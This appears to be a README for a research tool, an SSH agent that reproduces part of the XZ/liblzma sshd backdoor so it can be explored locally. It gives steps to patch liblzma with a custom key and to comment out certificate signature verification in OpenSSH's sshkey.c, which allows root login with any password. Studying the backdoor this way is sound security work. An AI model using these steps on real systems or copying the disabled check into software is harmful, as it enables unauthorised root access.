# Jia Tan's SSH Agent

Simple SSH Agent that implements some of the XZ sshd backdoor functionality.

For those who want to more easily explore the backdoor using a typical SSH client.

![demo](assets/demo.png)

## Usage

- Patch your liblzma.so with a [custom ed448 public key](https://github.com/amlweems/xzbot/tree/main?tab=readme-ov-file#ed448-patch)
- Patch your SSH client to skip verification of the certificate:
  - Look for this section in openssh's `sshkey.c` and commment it out:
  ```c
  if ((ret = sshkey_verify(key->cert->signature_key, sig, slen,
             sshbuf_ptr(key->cert->certblob), signed_len, NULL, 0, NULL)) != 0)
  {
  	goto out;
  }
  ```
- `python3 -m virtualenv venv && . venv/bin/activate && pip install -r requirements.txt`
- `python3 agent.py /tmp/agent ./privkey.bin`
- `SSH_AUTH_SOCK=/tmp/agent ./ssh root@localhost`
- log in with any password :)

-- blasty `<peter@haxx.in>`
